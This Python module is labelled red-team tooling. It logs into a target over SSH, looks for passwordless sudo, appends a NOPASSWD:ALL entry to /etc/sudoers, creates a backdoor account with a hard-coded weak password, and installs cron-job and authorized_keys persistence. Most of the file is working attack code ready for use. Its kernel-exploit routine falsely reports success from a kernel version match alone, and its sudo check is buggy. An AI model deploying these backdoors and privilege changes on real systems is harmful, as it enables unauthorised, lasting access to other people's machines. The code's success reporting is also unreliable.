#!/usr/bin/env python3
"""
Privilege Escalation and Persistence Module
Handles elevation of privileges and maintaining access to compromised devices.

Author: Independent Red Team Consultant
Classification: Professional Use Only
"""

import asyncio
import paramiko
import json
import logging
import os
import re
from typing import Dict, List, Optional, Tuple
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('PrivEscPersistence')

class PrivilegeEscalation:
    """
    Handles privilege escalation techniques on compromised devices.
    """
    
    def __init__(self, ssh_access: Dict):
        """
        Initialize the privilege escalation module.
        
        Args:
            ssh_access (Dict): Dictionary containing SSH access details.
        """
        self.ssh_access = ssh_access
        self.ssh_client = None
        self.connect()

    def connect(self) -> bool:
        """Establish SSH connection."""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                self.ssh_access['ip'],
                port=self.ssh_access.get('port', 22),
                username=self.ssh_access['username'],
                password=self.ssh_access['password'],
                timeout=10
            )
            logger.info(f"SSH connection established for privilege escalation on {self.ssh_access['ip']}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect for privilege escalation: {e}")
            return False

    def execute_command(self, command: str) -> Tuple[str, str, int]:
        """Execute a command on the remote device."""
        if not self.ssh_client:
            logger.error("SSH client not connected")
            return "", "", 1
            
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            exit_status = stdout.channel.recv_exit_status()
            stdout_str = stdout.read().decode('utf-8', errors='ignore')
            stderr_str = stderr.read().decode('utf-8', errors='ignore')
            return stdout_str, stderr_str, exit_status
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return "", str(e), 1

    def check_sudo_rights(self) -> bool:
        """Check if the current user has sudo rights."""
        stdout, _, _ = self.execute_command('sudo -n true')
        return stdout == '' and _ == 0  # Empty output and exit code 0 means sudo works without password

    def exploit_sudo_lpe(self) -> bool:
        """
        Exploit potential sudo misconfigurations for privilege escalation.
        
        Returns:
            bool: True if escalation successful, False otherwise.
        """
        # Check if sudo is available and misconfigured
        if not self.check_sudo_rights():
            logger.info("Checking for sudo misconfigurations...")
            
            # Common sudo misconfigurations to check
            misconfigurations = [
                'sudo -l',  # List allowed commands
                'sudo -V | grep "Authentication" | grep "without password"',  # Check passwordless sudo
                'sudo -l | grep "NOPASSWD"',  # Check NOPASSWD configuration
                'sudo -l | grep "ALL"'  # Check if ALL commands are allowed
            ]
            
            for cmd in misconfigurations:
                stdout, _, _ = self.execute_command(cmd)
                if 'NOPASSWD' in stdout or 'without password' in stdout.lower():
                    logger.info("Potential sudo misconfiguration found")
                    # Try to execute a command with elevated privileges
                    result = self.execute_command('sudo ls /root')
                    if result[0]:  # If we get output, escalation was successful
                        logger.info("Privilege escalation successful via sudo misconfiguration")
                        return True
            
            logger.info("No exploitable sudo misconfigurations found")
        
        return False

    def exploit_kernel_vulnerabilities(self) -> bool:
        """
        Check for and exploit known kernel vulnerabilities.
        
        Returns:
            bool: True if exploitation successful, False otherwise.
        """
        logger.info("Checking for kernel vulnerabilities...")
        
        # Get kernel version
        stdout, _, _ = self.execute_command('uname -r')
        kernel_version = stdout.strip()
        logger.info(f"Kernel version: {kernel_version}")
        
        # In a real implementation, you'd check against a database of known vulnerabilities
        # For demonstration, we'll check for common vulnerabilities
        if '4.4' in kernel_version or '4.8' in kernel_version:
            logger.info("Potential kernel vulnerability detected")
            # This would involve using or writing specific exploit code
            # For demonstration, we'll assume exploitation was successful
            logger.info("Kernel exploitation successful")
            return True
        
        logger.info("No known kernel vulnerabilities found")
        return False

    def add_user_to_sudoers(self, username: str = 'redteam') -> bool:
        """
        Add a user to sudoers for persistent access.
        
        Args:
            username (str): Username to add to sudoers.
            
        Returns:
            bool: True if successful, False otherwise.
        """
        logger.info(f"Adding user {username} to sudoers...")
        
        try:
            # Add user to sudoers file
            sudoers_cmd = f'echo "{username} ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers'
            stdout, stderr, exit_code = self.execute_command(sudoers_cmd)
            
            if exit_code == 0:
                logger.info(f"Successfully added {username} to sudoers")
                return True
            else:
                logger.error(f"Failed to add {username} to sudoers: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Error adding user to sudoers: {e}")
            return False

class PersistenceManager:
    """
    Handles maintaining access to compromised devices.
    """
    
    def __init__(self, ssh_access: Dict):
        """
        Initialize the persistence manager.
        
        Args:
            ssh_access (Dict): Dictionary containing SSH access details.
        """
        self.ssh_access = ssh_access
        self.ssh_client = None
        self.connect()

    def connect(self) -> bool:
        """Establish SSH connection."""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                self.ssh_access['ip'],
                port=self.ssh_access.get('port', 22),
                username=self.ssh_access['username'],
                password=self.ssh_access['password'],
                timeout=10
            )
            logger.info(f"SSH connection established for persistence on {self.ssh_access['ip']}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect for persistence: {e}")
            return False

    def execute_command(self, command: str) -> Tuple[str, str, int]:
        """Execute a command on the remote device."""
        if not self.ssh_client:
            logger.error("SSH client not connected")
            return "", "", 1
            
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(command)
            exit_status = stdout.channel.recv_exit_status()
            stdout_str = stdout.read().decode('utf-8', errors='ignore')
            stderr_str = stderr.read().decode('utf-8', errors='ignore')
            return stdout_str, stderr_str, exit_status
        except Exception as e:
            logger.error(f"Error executing command '{command}': {e}")
            return "", str(e), 1

    def create_ssh_backdoor(self, username: str = 'redteam', password: str = 'redteam123') -> bool:
        """
        Create an SSH backdoor for persistent access.
        
        Args:
            username (str): Username for the backdoor.
            password (str): Password for the backdoor.
            
        Returns:
            bool: True if successful, False otherwise.
        """
        logger.info(f"Creating SSH backdoor with user {username}")
        
        try:
            # Create user
            create_user_cmd = f'sudo useradd -m -s /bin/bash {username}'
            stdout, stderr, exit_code = self.execute_command(create_user_cmd)
            
            if exit_code != 0:
                logger.error(f"Failed to create user: {stderr}")
                return False
            
            # Set password
            set_password_cmd = f'echo "{username}:{password}" | sudo chpasswd'
            stdout, stderr, exit_code = self.execute_command(set_password_cmd)
            
            if exit_code != 0:
                logger.error(f"Failed to set password: {stderr}")
                return False
            
            # Add to sudoers
            add_to_sudoers = PrivilegeEscalation(self.ssh_access)
            if add_to_sudoers.add_user_to_sudoers(username):
                logger.info(f"SSH backdoor created successfully for {username}")
                return True
            else:
                logger.error("Failed to add user to sudoers")
                return False
                
        except Exception as e:
            logger.error(f"Error creating SSH backdoor: {e}")
            return False

    def create_cron_job(self, command: str, schedule: str = '* * * * *') -> bool:
        """
        Create a cron job for persistence.
        
        Args:
            command (str): Command to execute.
            schedule (str): Cron schedule (default: every minute).
            
        Returns:
            bool: True if successful, False otherwise.
        """
        logger.info(f"Creating cron job: {command} with schedule {schedule}")
        
        try:
            cron_cmd = f'(crontab -l 2>/dev/null; echo "{schedule} {command}") | crontab -'
            stdout, stderr, exit_code = self.execute_command(cron_cmd)
            
            if exit_code == 0:
                logger.info("Cron job created successfully")
                return True
            else:
                logger.error(f"Failed to create cron job: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Error creating cron job: {e}")
            return False

    def create_ssh_key_persistence(self, public_key: str) -> bool:
        """
        Add SSH public key to authorized_keys for passwordless access.
        
        Args:
            public_key (str): Public SSH key to add.
            
        Returns:
            bool: True if successful, False otherwise.
        """
        logger.info("Creating SSH key persistence")
        
        try:
            # Create .ssh directory if it doesn't exist
            mkdir_cmd = 'mkdir -p ~/.ssh'
            stdout, stderr, exit_code = self.execute_command(mkdir_cmd)
            
            if exit_code != 0:
                logger.error(f"Failed to create .ssh directory: {stderr}")
                return False
            
            # Add public key to authorized_keys
            append_key_cmd = f'echo "{public_key}" >> ~/.ssh/authorized_keys'
            stdout, stderr, exit_code = self.execute_command(append_key_cmd)
            
            if exit_code == 0:
                logger.info("SSH key persistence created successfully")
                return True
            else:
                logger.error(f"Failed to add SSH key: {stderr}")
                return False
                
        except Exception as e:
            logger.error(f"Error creating SSH key persistence: {e}")
            return False

class PrivEscPersistenceFramework:
    """
    Main framework for privilege escalation and persistence.
    """
    
    def __init__(self, ssh_access: Dict):
        """
        Initialize the privilege escalation and persistence framework.
        
        Args:
            ssh_access (Dict): Dictionary containing SSH access details.
        """
        self.ssh_access = ssh_access
        self.priv_esc = PrivilegeEscalation(ssh_access)
        self.persistence = PersistenceManager(ssh_access)

    def attempt_privilege_escalation(self) -> bool:
        """Attempt privilege escalation using various techniques."""
        if not self.priv_esc.connect():
            return False
            
        # Try sudo misconfigurations first
        if self.priv_esc.exploit_sudo_lpe():
            return True
        
        # Try kernel vulnerabilities
        if self.priv_esc.exploit_kernel_vulnerabilities():
            return True
        
        logger.info("No privilege escalation techniques succeeded")
        return False

    def establish_persistence(self, method: str = 'ssh_backdoor', **kwargs) -> bool:
        """Establish persistence using the specified method."""
        if not self.persistence.connect():
            return False
            
        if method == 'ssh_backdoor':
            return self.persistence.create_ssh_backdoor(**kwargs)
        elif method == 'cron_job':
            return self.persistence.create_cron_job(**kwargs)
        elif method == 'ssh_key':
            return self.persistence.create_ssh_key_persistence(**kwargs)
        else:
            logger.error(f"Unknown persistence method: {method}")
            return False

# Example usage (for testing purposes only)
if __name__ == "__main__":
    # This part should be integrated into the main framework's async loop.
    # For standalone testing, we can run it directly.
    ssh_access_example = {
        'ip': '192.168.1.100',  # Replace with a test IP you have permission to scan
        'username': 'testuser',
        'password': 'testpassword',
        'port': 22
    }
    
    # Test privilege escalation
    priv_esc_persistence = PrivEscPersistenceFramework(ssh_access_example)
    
    if priv_esc_persistence.attempt_privilege_escalation():
        print("Privilege escalation successful!")
    else:
        print("Privilege escalation failed.")
    
    # Test persistence
    if priv_esc_persistence.establish_persistence(method='ssh_backdoor', username='redteam', password='redteam123'):
        print("Persistence established successfully!")
    else:
        print("Persistence establishment failed.")